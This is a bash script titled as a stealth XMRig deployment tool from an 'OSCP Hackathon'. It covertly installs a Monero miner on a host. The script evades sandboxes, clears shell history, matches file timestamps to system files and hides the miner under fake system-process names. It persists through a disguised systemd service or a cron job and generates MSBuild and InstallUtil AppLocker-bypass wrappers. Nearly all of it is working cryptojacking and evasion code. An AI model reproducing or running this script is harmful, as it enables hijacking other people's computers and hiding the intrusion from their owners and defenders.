#!/bin/bash
################################################################################
# XMRig Stealth Deployment Script
# Purpose: Automated deployment with evasion techniques
# Author: OSCP Hackathon 2025
# Usage: ./stealth_deploy.sh [wallet_address] [pool_url]
################################################################################

set -e  # Exit on error

# Configuration
WALLET_ADDRESS="${1:-YOUR_WALLET_HERE}"
POOL_URL="${2:-pool.supportxmr.com:443}"
DOWNLOAD_URL="https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Stealth configuration
USE_STEALTH=true
EVASION_LEVEL="high"  # low, medium, high
APPLOCKER_BYPASS=false  # Enable AppLocker bypass techniques
BYPASS_METHOD="msbuild"  # msbuild, installutil, regsvr32, trusted-dir

################################################################################
# Banner
################################################################################
print_banner() {
    echo -e "${BLUE}========================================${NC}"
    echo -e "${BLUE}  XMRig Stealth Deployment Tool${NC}"
    echo -e "${BLUE}  OSCP Hackathon 2025${NC}"
    echo -e "${BLUE}========================================${NC}"
    echo ""
}

################################################################################
# Logging
################################################################################
log_info() {
    echo -e "${GREEN}[+]${NC} $1"
}

log_warn() {
    echo -e "${YELLOW}[!]${NC} $1"
}

log_error() {
    echo -e "${RED}[-]${NC} $1"
}

log_step() {
    echo -e "${BLUE}[*]${NC} $1"
}

################################################################################
# Sandbox Detection
################################################################################
detect_sandbox() {
    log_step "Checking for sandbox environment..."

    local sandbox_score=0

    # Check CPU cores
    cpu_count=$(nproc)
    if [ "$cpu_count" -lt 2 ]; then
        log_warn "Low CPU count detected: $cpu_count cores"
        ((sandbox_score++))
    fi

    # Check RAM
    total_ram=$(free -m | awk 'NR==2{print $2}')
    if [ "$total_ram" -lt 2048 ]; then
        log_warn "Low RAM detected: ${total_ram}MB"
        ((sandbox_score++))
    fi

    # Check disk size
    disk_size=$(df / | awk 'NR==2{print $2}')
    if [ "$disk_size" -lt 20000000 ]; then  # Less than ~20GB
        log_warn "Small disk detected"
        ((sandbox_score++))
    fi

    # Check for VM indicators
    if lsmod | grep -iq "vbox\|vmware\|kvm"; then
        log_warn "VM kernel modules detected"
        ((sandbox_score++))
    fi

    # Check uptime (sandbox usually fresh)
    uptime_seconds=$(awk '{print $1}' /proc/uptime | cut -d'.' -f1)
    if [ "$uptime_seconds" -lt 600 ]; then  # Less than 10 minutes
        log_warn "Low system uptime: ${uptime_seconds}s"
        ((sandbox_score++))
    fi

    if [ "$sandbox_score" -ge 3 ]; then
        log_error "Sandbox environment detected (score: $sandbox_score/5)"
        log_error "Aborting deployment for OPSEC"
        return 1
    else
        log_info "Sandbox checks passed (score: $sandbox_score/5)"
        return 0
    fi
}

################################################################################
# Anti-Forensics - Clear tracks
################################################################################
clear_tracks() {
    log_step "Clearing deployment tracks..."

    # Clear bash history for current session
    history -c
    export HISTFILE=/dev/null
    unset HISTFILE

    # Remove wget/curl history
    rm -f ~/.wget-hsts 2>/dev/null || true

    log_info "Tracks cleared"
}

################################################################################
# Generate random names for obfuscation
################################################################################
generate_random_name() {
    # Generate legitimate-sounding system process name
    local names=(
        "systemd-monitor"
        "kworker-update"
        "update-notifier"
        "dbus-daemon-helper"
        "systemd-logind"
        "accounts-daemon"
        "gnome-shell-ext"
        "packagekitd-helper"
    )

    echo "${names[$RANDOM % ${#names[@]}]}"
}

generate_hidden_path() {
    # Generate hidden directory path
    local paths=(
        "/tmp/..."
        "/var/tmp/.systemd"
        "/opt/.cache"
        "/usr/local/lib/.fonts"
        "/var/cache/.update"
    )

    echo "${paths[$RANDOM % ${#paths[@]}]}"
}

################################################################################
# Download and prepare binary
################################################################################
download_binary() {
    log_step "Downloading XMRig binary..."

    local tmp_dir="/tmp/.download_$$"
    mkdir -p "$tmp_dir"

    # Download with stealth (use TLS, random User-Agent)
    local user_agents=(
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        "curl/7.68.0"
        "Wget/1.20.3"
    )

    local user_agent="${user_agents[$RANDOM % ${#user_agents[@]}]}"

    wget --quiet \
         --user-agent="$user_agent" \
         --no-check-certificate \
         "$DOWNLOAD_URL" \
         -O "$tmp_dir/xmrig.tar.gz"

    if [ $? -ne 0 ]; then
        log_error "Download failed"
        rm -rf "$tmp_dir"
        return 1
    fi

    # Extract
    tar -xzf "$tmp_dir/xmrig.tar.gz" -C "$tmp_dir"

    # Find binary
    XMRIG_BINARY=$(find "$tmp_dir" -name "xmrig" -type f)

    if [ -z "$XMRIG_BINARY" ]; then
        log_error "XMRig binary not found in archive"
        rm -rf "$tmp_dir"
        return 1
    fi

    log_info "Binary downloaded: $XMRIG_BINARY"
    echo "$XMRIG_BINARY"
}

################################################################################
# Install binary with stealth
################################################################################
install_binary() {
    local source_binary="$1"
    log_step "Installing binary with stealth measures..."

    # Generate stealth installation path
    INSTALL_DIR=$(generate_hidden_path)
    PROCESS_NAME=$(generate_random_name)

    mkdir -p "$INSTALL_DIR"

    INSTALL_PATH="$INSTALL_DIR/$PROCESS_NAME"

    # Copy and make executable
    cp "$source_binary" "$INSTALL_PATH"
    chmod +x "$INSTALL_PATH"

    # Match timestamps with system files (anti-forensics)
    touch -r /bin/ls "$INSTALL_PATH"

    log_info "Installed to: $INSTALL_PATH"
    log_info "Process name: $PROCESS_NAME"

    echo "$INSTALL_PATH"
}

################################################################################
# Create stealth configuration
################################################################################
create_config() {
    local install_dir="$1"
    log_step "Creating stealth configuration..."

    CONFIG_FILE="$install_dir/.config.json"

    # Determine stealth level
    case "$EVASION_LEVEL" in
        "low")
            THREADS=4
            PRIORITY=2
            PAUSE_ACTIVE=0
            ;;
        "medium")
            THREADS=2
            PRIORITY=1
            PAUSE_ACTIVE=60
            ;;
        "high")
            THREADS=1
            PRIORITY=0
            PAUSE_ACTIVE=120
            ;;
    esac

    cat > "$CONFIG_FILE" <<EOF
{
    "autosave": false,
    "background": true,
    "colors": false,
    "randomx": {
        "mode": "light",
        "1gb-pages": false,
        "rdmsr": false,
        "wrmsr": false,
        "numa": false
    },
    "cpu": {
        "enabled": true,
        "huge-pages": false,
        "priority": $PRIORITY,
        "max-threads-hint": $(( THREADS * 100 / $(nproc) )),
        "yield": true
    },
    "pools": [{
        "url": "$POOL_URL",
        "user": "$WALLET_ADDRESS",
        "pass": "x",
        "tls": true,
        "keepalive": true,
        "enabled": true
    }],
    "log-file": null,
    "print-time": 300,
    "health-print-time": 300,
    "retries": 10,
    "retry-pause": 10,
    "syslog": false,
    "watch": true,
    "pause-on-battery": true,
    "pause-on-active": $PAUSE_ACTIVE
}
EOF

    # Match timestamps
    touch -r /bin/ls "$CONFIG_FILE"

    log_info "Config created: $CONFIG_FILE"
    log_info "Evasion level: $EVASION_LEVEL"
    log_info "CPU threads: $THREADS ($(( THREADS * 100 / $(nproc) ))%)"
    log_info "Priority: $PRIORITY (idle)"
    log_info "Pause on active: ${PAUSE_ACTIVE}s"

    echo "$CONFIG_FILE"
}

################################################################################
# Setup persistence
################################################################################
setup_persistence() {
    local binary_path="$1"
    local config_path="$2"

    log_step "Setting up persistence..."

    # Check if we have root
    if [ "$EUID" -eq 0 ]; then
        log_info "Root access detected - using systemd"
        setup_systemd_persistence "$binary_path" "$config_path"
    else
        log_info "User-level access - using cron"
        setup_cron_persistence "$binary_path" "$config_path"
    fi
}

setup_systemd_persistence() {
    local binary_path="$1"
    local config_path="$2"

    SERVICE_NAME=$(basename "$binary_path")

    cat > "/etc/systemd/system/${SERVICE_NAME}.service" <<EOF
[Unit]
Description=System Resource Monitor
After=network.target
Wants=network-online.target

[Service]
Type=simple
User=nobody
Group=nogroup
ExecStart=$binary_path -c $config_path
Restart=always
RestartSec=30
StandardOutput=null
StandardError=null

# Security hardening (ironic)
PrivateTmp=true
NoNewPrivileges=true

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    systemctl enable "${SERVICE_NAME}.service" 2>/dev/null
    systemctl start "${SERVICE_NAME}.service" 2>/dev/null

    log_info "Systemd service created: ${SERVICE_NAME}.service"
}

setup_cron_persistence() {
    local binary_path="$1"
    local config_path="$2"

    # Add to user crontab
    (crontab -l 2>/dev/null; echo "@reboot $binary_path -c $config_path >/dev/null 2>&1") | crontab -

    log_info "Cron job created (user-level)"
}

################################################################################
# Execute miner (testing)
################################################################################
test_execution() {
    local binary_path="$1"
    local config_path="$2"

    log_step "Testing miner execution..."

    # Run in background
    nohup "$binary_path" -c "$config_path" >/dev/null 2>&1 &
    MINER_PID=$!

    sleep 5

    # Check if still running
    if kill -0 $MINER_PID 2>/dev/null; then
        log_info "Miner started successfully (PID: $MINER_PID)"
        log_info "Process name: $(ps -p $MINER_PID -o comm=)"

        # Show resource usage
        ps -p $MINER_PID -o pid,comm,%cpu,%mem,etime

        return 0
    else
        log_error "Miner failed to start"
        return 1
    fi
}

################################################################################
# AppLocker Bypass - LOLBAS Techniques
################################################################################
detect_applocker() {
    log_step "Checking for AppLocker..."

    # Check for Windows environment (if deploying cross-platform)
    if [ -d "/mnt/c/Windows" ]; then
        log_info "Windows detected (WSL environment)"
        # In a real deployment, check AppLocker via PowerShell
        # For now, assume enabled if configured
        if [ "$APPLOCKER_BYPASS" = true ]; then
            log_warn "AppLocker bypass mode enabled"
            return 0
        fi
    fi

    log_info "Linux environment - AppLocker not applicable"
    return 1
}

generate_msbuild_wrapper() {
    local binary_path="$1"
    local config_path="$2"
    log_step "Generating MSBuild wrapper for AppLocker bypass..."

    local wrapper_path="$(dirname "$binary_path")/build.xml"

    # Encode binary as base64 for embedding
    local binary_b64=$(base64 -w 0 "$binary_path")

    cat > "$wrapper_path" <<'MSBUILD_EOF'
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- XMRig MSBuild Wrapper - AppLocker Bypass -->
  <Target Name="Execute">
    <XMRigTask />
  </Target>

  <UsingTask TaskName="XMRigTask" TaskFactory="CodeTaskFactory"
             AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
      <![CDATA[
        using System;
        using System.IO;
        using System.Diagnostics;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;

        public class XMRigTask : Task
        {
            public override bool Execute()
            {
                try
                {
                    // Decode embedded XMRig binary
                    string base64Binary = "BINARY_BASE64_HERE";
                    byte[] binaryData = Convert.FromBase64String(base64Binary);

                    // Write to temp location
                    string tempPath = Path.Combine(Path.GetTempPath(), "system-process.exe");
                    File.WriteAllBytes(tempPath, binaryData);

                    // Execute XMRig
                    ProcessStartInfo psi = new ProcessStartInfo();
                    psi.FileName = tempPath;
                    psi.Arguments = "-c CONFIG_PATH_HERE --background";
                    psi.CreateNoWindow = true;
                    psi.WindowStyle = ProcessWindowStyle.Hidden;
                    psi.UseShellExecute = false;

                    Process.Start(psi);

                    Log.LogMessage("XMRig started successfully");
                    return true;
                }
                catch (Exception ex)
                {
                    Log.LogError("Error: " + ex.Message);
                    return false;
                }
            }
        }
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
MSBUILD_EOF

    # Replace placeholders (truncate binary_b64 if too large for demo)
    # In production, split into multiple chunks
    sed -i "s|BINARY_BASE64_HERE|${binary_b64:0:1000}...|g" "$wrapper_path"
    sed -i "s|CONFIG_PATH_HERE|$config_path|g" "$wrapper_path"

    log_info "MSBuild wrapper created: $wrapper_path"
    log_info "Execute with: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe $wrapper_path"

    echo "$wrapper_path"
}

generate_installutil_wrapper() {
    local binary_path="$1"
    local config_path="$2"
    log_step "Generating InstallUtil wrapper for AppLocker bypass..."

    local wrapper_path="$(dirname "$binary_path")/installer.cs"

    cat > "$wrapper_path" <<'INSTALLUTIL_EOF'
// XMRig InstallUtil Wrapper - AppLocker Bypass
// Compile: csc /target:library /out:installer.dll installer.cs
// Execute: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /U installer.dll

using System;
using System.IO;
using System.Configuration.Install;
using System.Diagnostics;
using System.ComponentModel;

namespace XMRigInstaller
{
    [RunInstaller(true)]
    public class XMRigInstaller : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            // Embedded XMRig binary (base64)
            string base64Binary = "BINARY_BASE64_HERE";

            try
            {
                // Decode binary
                byte[] binaryData = Convert.FromBase64String(base64Binary);

                // Write to disk
                string tempPath = Path.Combine(Path.GetTempPath(), "update-service.exe");
                File.WriteAllBytes(tempPath, binaryData);

                // Execute XMRig
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = tempPath;
                psi.Arguments = "-c CONFIG_PATH_HERE --background";
                psi.CreateNoWindow = true;
                psi.WindowStyle = ProcessWindowStyle.Hidden;
                psi.UseShellExecute = false;

                Process.Start(psi);

                // Cleanup
                System.Threading.Thread.Sleep(2000);
                try { File.Delete(tempPath); } catch { }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
        }
    }
}
INSTALLUTIL_EOF

    local binary_b64=$(base64 -w 0 "$binary_path")
    sed -i "s|BINARY_BASE64_HERE|${binary_b64:0:1000}...|g" "$wrapper_path"
    sed -i "s|CONFIG_PATH_HERE|$config_path|g" "$wrapper_path"

    log_info "InstallUtil wrapper created: $wrapper_path"
    log_info "Compile: csc /target:library /out:installer.dll $wrapper_path"
    log_info "Execute: InstallUtil.exe /U installer.dll"

    echo "$wrapper_path"
}

deploy_to_trusted_directory() {
    local binary_path="$1"
    log_step "Deploying to AppLocker trusted directory..."

    # AppLocker typically trusts these Windows directories:
    # - C:\Windows\System32\
    # - C:\Windows\SysWOW64\
    # - C:\Program Files\
    # - C:\Program Files (x86)\

    # Alternative trusted directories that may have write access:
    local trusted_dirs=(
        "C:\\Windows\\Tasks"
        "C:\\Windows\\tracing"
        "C:\\Windows\\Registration\\CRMLog"
        "C:\\Windows\\System32\\FxsTmp"
        "C:\\Windows\\System32\\com\\dmp"
        "C:\\Windows\\System32\\Microsoft\\Crypto\\RSA\\MachineKeys"
        "C:\\Windows\\System32\\spool\\drivers\\color"
    )

    log_info "Recommended trusted directories:"
    for dir in "${trusted_dirs[@]}"; do
        echo "  - $dir"
    done

    log_warn "Manual deployment required to Windows trusted directory"
    log_info "Copy $binary_path to one of the above locations"
}

setup_applocker_bypass() {
    local binary_path="$1"
    local config_path="$2"

    if [ "$APPLOCKER_BYPASS" != true ]; then
        return 0
    fi

    log_step "Setting up AppLocker bypass..."

    case "$BYPASS_METHOD" in
        "msbuild")
            generate_msbuild_wrapper "$binary_path" "$config_path"
            ;;
        "installutil")
            generate_installutil_wrapper "$binary_path" "$config_path"
            ;;
        "trusted-dir")
            deploy_to_trusted_directory "$binary_path"
            ;;
        *)
            log_warn "Unknown bypass method: $BYPASS_METHOD"
            ;;
    esac

    log_info "AppLocker bypass setup complete"
}

################################################################################
# Cleanup deployment artifacts
################################################################################
cleanup_deployment() {
    log_step "Cleaning up deployment artifacts..."

    # Remove downloaded files
    rm -rf /tmp/.download_* 2>/dev/null || true
    rm -f /tmp/xmrig* 2>/dev/null || true

    # Clear history again
    history -c
    export HISTFILE=/dev/null

    log_info "Cleanup complete"
}

################################################################################
# Main deployment workflow
################################################################################
main() {
    print_banner

    # Validate arguments
    if [ "$WALLET_ADDRESS" == "YOUR_WALLET_HERE" ]; then
        log_error "Please provide a wallet address"
        echo "Usage: $0 <wallet_address> [pool_url]"
        exit 1
    fi

    log_info "Wallet: $WALLET_ADDRESS"
    log_info "Pool: $POOL_URL"
    echo ""

    # Step 1: Sandbox detection
    if ! detect_sandbox; then
        exit 1
    fi
    echo ""

    # Step 2: Clear initial tracks
    clear_tracks
    echo ""

    # Step 3: Download binary
    BINARY_PATH=$(download_binary)
    if [ -z "$BINARY_PATH" ]; then
        log_error "Failed to download binary"
        exit 1
    fi
    echo ""

    # Step 4: Install with stealth
    INSTALLED_BINARY=$(install_binary "$BINARY_PATH")
    echo ""

    # Step 5: Create config
    CONFIG_PATH=$(create_config "$(dirname "$INSTALLED_BINARY")")
    echo ""

    # Step 6: AppLocker bypass (if enabled)
    if [ "$APPLOCKER_BYPASS" = true ]; then
        setup_applocker_bypass "$INSTALLED_BINARY" "$CONFIG_PATH"
        echo ""
    fi

    # Step 7: Setup persistence
    setup_persistence "$INSTALLED_BINARY" "$CONFIG_PATH"
    echo ""

    # Step 8: Test execution
    test_execution "$INSTALLED_BINARY" "$CONFIG_PATH"
    echo ""

    # Step 9: Cleanup
    cleanup_deployment
    echo ""

    # Summary
    echo -e "${GREEN}========================================${NC}"
    echo -e "${GREEN}  Deployment Complete!${NC}"
    echo -e "${GREEN}========================================${NC}"
    echo ""
    echo "Installation Summary:"
    echo "  Binary: $INSTALLED_BINARY"
    echo "  Config: $CONFIG_PATH"
    echo "  Process: $(basename "$INSTALLED_BINARY")"
    echo "  PID: $MINER_PID"
    echo ""
    echo "Monitoring Commands:"
    echo "  ps aux | grep $(basename "$INSTALLED_BINARY")"
    echo "  top -p $MINER_PID"
    echo "  netstat -tunap | grep $(basename "$INSTALLED_BINARY")"
    echo ""
    echo "Removal Commands:"
    echo "  kill $MINER_PID"
    echo "  rm -rf $(dirname "$INSTALLED_BINARY")"
    echo "  crontab -e  # Remove cron entry"
    echo ""
}

# Execute main function
main "$@"
